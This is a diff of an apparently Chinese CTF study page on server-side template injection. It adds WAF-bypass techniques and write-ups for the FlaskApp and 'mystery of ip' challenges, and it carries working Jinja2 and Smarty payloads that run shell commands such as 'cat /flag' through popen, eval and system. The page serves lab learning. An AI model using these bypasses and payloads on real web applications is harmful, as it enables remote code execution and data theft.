@@ -1945,6 +1945,28 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#75" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.5 实战：五种过滤，五种换法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#76" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.6 判断顺序（卡住时按这个走）
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2028,6 +2050,28 @@
     <span class="md-ellipsis">
       
         [BJDCTF 2nd] fake google
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gyctf2020-flaskapp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        [GYCTF2020] FlaskApp
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bjdctf2020-the-mystery-of-ip" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        [BJDCTF2020] The mystery of ip
       
     </span>
   </a>
@@ -4066,6 +4110,28 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#75" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.5 实战：五种过滤，五种换法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#76" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7.6 判断顺序（卡住时按这个走）
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -4149,6 +4215,28 @@
     <span class="md-ellipsis">
       
         [BJDCTF 2nd] fake google
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gyctf2020-flaskapp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        [GYCTF2020] FlaskApp
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bjdctf2020-the-mystery-of-ip" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        [BJDCTF2020] The mystery of ip
       
     </span>
   </a>
@@ -4603,17 +4691,60 @@
 <h3 id="74">7.4 沙箱<a class="headerlink" href="#74" title="Permanent link">&para;</a></h3>
 <p><strong>Jinja2 有 <code>SandboxedEnvironment</code>，会限制 <code>__</code> 开头的属性访问。默认的 Flask 渲染环境</strong>不是<strong>沙箱——这是为什么默认就能打。</strong></p>
 <p><strong>遇到"沙箱"报错时，先确认它到底是真沙箱，还是应用层做了关键词替换。</strong>两者绕法完全不同。</p>
+<h3 id="75">7.5 实战：五种过滤，五种换法<a class="headerlink" href="#75" title="Permanent link">&para;</a></h3>
+<p><strong>下面每一条都是真打过的，不是设想。</strong></p>
+<h4 id="1-_">① 拦下划线 <code>_</code><a class="headerlink" href="#1-_" title="Permanent link">&para;</a></h4>
+<p><strong><code>__class__</code>、<code>__globals__</code> 全都带下划线，一个都写不出来。</strong></p>
+<p><strong>换法：名字不从模板里写，从</strong>另一个参数<strong>偷运过来。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>?name={{''|attr(request.args.a)|attr(request.args.b)|first}}&amp;a=__class__&amp;b=__bases__
+</span></code></pre></div>
+<p><strong>过滤器只检查 <code>name</code>，<code>a</code>、<code>b</code> 是通道。</strong><code>name</code> 里一个下划线都没有。</p>
+<h4 id="2">② 拦 <code>{{ }}</code><a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
+<p><strong>连输出括号都不给了。</strong></p>
+<p><strong>换法：Jinja 还有 <code>{% %}</code> 语句，其中 <code>print</code> 就是用来输出的（Jinja 3 才有）。</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="cp">{%</span> <span class="k">print</span><span class="o">(</span><span class="s1">''</span><span class="o">|</span><span class="nf">attr</span><span class="o">(</span><span class="p">...</span><span class="o">))</span> <span class="cp">%}</span>
+</span></code></pre></div>
+<p><strong>备选：<code>{% filter %}</code> 能处理包在里面的字面量。</strong></p>
+<h4 id="3-class-globals-attr-os">③ 拦关键词（<code>class</code> / <code>globals</code> / <code>attr</code> / <code>os</code>）<a class="headerlink" href="#3-class-globals-attr-os" title="Permanent link">&para;</a></h4>
+<p><strong>换法：把词拆开，让原文里不出现完整的那串字母。</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="cp">{{</span><span class="s1">''</span><span class="o">[</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="o">]</span><span class="cp">}}</span><span class="x">          →  &lt;class 'str'&gt;</span>
+</span></code></pre></div>
+<p><strong>为什么必须用方括号：点号后面只能跟</strong>字面名字<strong>，没法拼接；<code>attr</code> 又可能一起被拦。</strong></p>
+<h4 id="4">④ 子串匹配的坑：拆词时每一段都要检查<a class="headerlink" href="#4" title="Permanent link">&para;</a></h4>
+<p><strong>拦截是</strong>子串<strong>匹配。所以：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>{{'host'}}   →  no no no      ← host 里含 os
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>{{'pas'}}    →  pas           ← 干净
+</span></code></pre></div>
+<p><strong>拆词不能只看"整体不出现"，要看</strong>每一段<strong>。</strong><code>'this_is_the_fl'+'ag.txt'</code> 两段都干净；<code>'cat /etc/host'+'name'</code> 第一段就中招了。**</p>
+<h4 id="5-jinja">⑤ 根本不是 Jinja<a class="headerlink" href="#5-jinja" title="Permanent link">&para;</a></h4>
+<p><strong><code>{{7*7}}</code> 回 49 就往下走，会走错路——</strong>Smarty 也回 49<strong>。</strong></p>
+<p><strong>换法：先换引擎，再换语法。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>{{7*'7'}}     →  7777777 = Jinja2     49 = PHP 系（Smarty/Twig）
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>{$smarty.version}  →  3.1.34          Smarty 的内置变量
+</span></code></pre></div>
+<p><strong>Smarty 3 没有 <code>{php}</code> 标签了，但有 <code>{if}</code>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>{if phpinfo()}{/if}     ← Smarty 把 {if 表达式} 编译成 PHP 的 if (...)
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>{if system('ls /')}{/if}
+</span></code></pre></div>
+<p><strong>注意 <code>{if}</code> 只判真假不输出，所以要挑</strong>自己会 echo** 的函数（<code>phpinfo</code>、<code>system</code>、<code>readfile</code>）。**</p>
+<h3 id="76">7.6 判断顺序（卡住时按这个走）<a class="headerlink" href="#76" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>① 三种反馈：空白 / 500 / 有内容        →  先定性质
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>② {{7*'7'}}                            →  先定引擎
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>③ 单独包一个词去测：{{'xxx'}}           →  定黑名单粒度
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>④ 换形状 or 换引擎 or 拼接             →  按上面的表选一个
+</span></code></pre></div>
+<p><strong>第③步最有用：把可疑的词一个一个包成 <code>{{'词'}}</code> 发过去，哪个回 <code>no no honey</code>/<code>no hack</code> 就是哪个。</strong>比整条 payload 试错快十倍。</p>
 <hr />
 <h2 id="_12">八、工具<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h2>
 <h3 id="sstimap">SSTImap（首选）<a class="headerlink" href="#sstimap" title="Permanent link">&para;</a></h3>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nv">$SM</span> <span class="p">=</span> <span class="s1">'E:\dsh\tools\SSTImap\sstimap.py'</span>
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">python</span> <span class="nv">$SM</span> <span class="n">-u</span> <span class="s2">"http://target/?name=*"</span> <span class="n">-e</span> <span class="n">jinja2</span>            <span class="c"># 探测</span>
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="n">python</span> <span class="nv">$SM</span> <span class="n">-u</span> <span class="s2">"http://target/?name=*"</span> <span class="n">-e</span> <span class="n">jinja2</span> <span class="n">-S</span> <span class="s2">"id"</span>    <span class="c"># 执行</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nv">$SM</span> <span class="p">=</span> <span class="s1">'E:\dsh\tools\SSTImap\sstimap.py'</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="n">python</span> <span class="nv">$SM</span> <span class="n">-u</span> <span class="s2">"http://target/?name=*"</span> <span class="n">-e</span> <span class="n">jinja2</span>            <span class="c"># 探测</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="n">python</span> <span class="nv">$SM</span> <span class="n">-u</span> <span class="s2">"http://target/?name=*"</span> <span class="n">-e</span> <span class="n">jinja2</span> <span class="n">-S</span> <span class="s2">"id"</span>    <span class="c"># 执行</span>
 </span></code></pre></div>
 <p><strong><code>*</code> 是注入点标记。它擅长：确认注入、认引擎、跑最普通那条链。</strong></p>
 <h3 id="fenjing-waf">Fenjing（国内常用，带 WAF 绕过）<a class="headerlink" href="#fenjing-waf" title="Permanent link">&para;</a></h3>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">fenjing</span>
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="n">fenjing</span> <span class="n">webui</span>         <span class="c"># 图形界面</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">fenjing</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="n">fenjing</span> <span class="n">webui</span>         <span class="c"># 图形界面</span>
 </span></code></pre></div>
 <h3 id="tplmap">tplmap（历史）<a class="headerlink" href="#tplmap" title="Permanent link">&para;</a></h3>
 <p><strong>Python 2 的，已归档。</strong><code>E:\dsh\tools\tplmap</code> 留着看代码和它的 Burp 插件。</p>
@@ -4624,16 +4755,38 @@
 <h3 id="bjdctf-2nd-fake-google">[BJDCTF 2<sup>nd</sup>] fake google<a class="headerlink" href="#bjdctf-2nd-fake-google" title="Permanent link">&para;</a></h3>
 <p><strong>一个输入框 → 试 SQL 注入，内容被原样打印 → 看源码发现 <code>sssssti</code> 提示 → <code>{{7*7}}</code> 得 49 → <code>{{7*'7'}}</code> 得 7777777 → <code>{{config}}</code> 确认 Flask。</strong></p>
 <p><strong>然后两条路都打通了：</strong></p>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="x"># 长链：_wrap_close 的 globals 里直接有 popen</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()[</span><span class="m">117</span><span class="o">]</span><span class="nv">.__init__.__globals__</span><span class="o">[</span><span class="s1">'popen'</span><span class="o">](</span><span class="s1">'cat /flag'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
-</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="x"># 长链：catch_warnings 走 __builtins__</span>
-</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()[</span><span class="m">169</span><span class="o">]</span><span class="nv">.__init__.__globals__</span><span class="o">[</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eval'</span><span class="o">](</span><span class="s2">"__import__('os').popen('cat /f*').read()"</span><span class="o">)</span><span class="cp">}}</span>
-</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>
-</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="x"># 短链</span>
-</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="cp">{{</span><span class="o">(</span><span class="nv">url_for.__globals__</span><span class="o">)[</span><span class="s1">'os'</span><span class="o">]</span><span class="nv">.popen</span><span class="o">(</span><span class="s1">'cat /f*'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="x"># 长链：_wrap_close 的 globals 里直接有 popen</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()[</span><span class="m">117</span><span class="o">]</span><span class="nv">.__init__.__globals__</span><span class="o">[</span><span class="s1">'popen'</span><span class="o">](</span><span class="s1">'cat /flag'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="x"># 长链：catch_warnings 走 __builtins__</span>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()[</span><span class="m">169</span><span class="o">]</span><span class="nv">.__init__.__globals__</span><span class="o">[</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eval'</span><span class="o">](</span><span class="s2">"__import__('os').popen('cat /f*').read()"</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="x"># 短链</span>
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="cp">{{</span><span class="o">(</span><span class="nv">url_for.__globals__</span><span class="o">)[</span><span class="s1">'os'</span><span class="o">]</span><span class="nv">.popen</span><span class="o">(</span><span class="s1">'cat /f*'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
 </span></code></pre></div>
 <p><strong>完整过程见 <a href="/blog/bjdctf2-fake-google-ssti/">WP</a>。</strong></p>
+<h3 id="gyctf2020-flaskapp">[GYCTF2020] FlaskApp<a class="headerlink" href="#gyctf2020-flaskapp" title="Permanent link">&para;</a></h3>
+<p><strong>解密功能把结果当模板渲染；有黑名单，但 <code>+</code> 没被拦。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>被拦：*  eval  os  popen  system  import  request  subprocess  flag
+</span></code></pre></div>
+<p><strong>两条路都要先 <code>ls /</code> 找文件名，再 <code>cat</code>：</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="x"># 短路</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'cat /this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="x"># 长链（eval 版，双层拆分：Jinja 一层 + Python 一层）</span>
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="cp">{{</span><span class="o">(</span><span class="err">...</span><span class="o">[</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eva'</span><span class="o">+</span><span class="s1">'l'</span><span class="o">](</span><span class="s1">'__imp'</span><span class="o">+</span><span class="s1">'ort__("o"+"s").pop'</span><span class="o">+</span><span class="s1">'en("cat /this_is_the_fl"+"ag.txt").read()'</span><span class="o">)</span><span class="cp">}}</span>
+</span></code></pre></div>
+<p><strong>这题还教了一件事：POST 之后 302 重定向，结果存在 session 里——"没回显"其实是 JSON 在下一页。</strong></p>
+<p><strong>完整过程见 <a href="/blog/gyctf2020-flaskapp-ssti/">WP</a>。</strong></p>
+<h3 id="bjdctf2020-the-mystery-of-ip">[BJDCTF2020] The mystery of ip<a class="headerlink" href="#bjdctf2020-the-mystery-of-ip" title="Permanent link">&para;</a></h3>
+<p><strong>不是 Jinja，是 Smarty（PHP）。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>注入点在 X-Forwarded-For（不在参数里）
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>{{7*'7'}} → 49          确认是 PHP 系
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>{$smarty.version} → 3.1.34
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>{if phpinfo()}{/if}      Smarty 3 的函数调用入口
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>{if system('cat /flag')}{/if}
+</span></code></pre></div>
+<p><strong>完整过程见 <a href="/blog/bjdctf2020-mystery-of-ip-smarty/">WP</a>。</strong></p>
 <hr />
 <h2 id="_15">十、十个坑<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h2>
 <p><strong>全是今天真踩过的，不是抄来的。</strong></p>
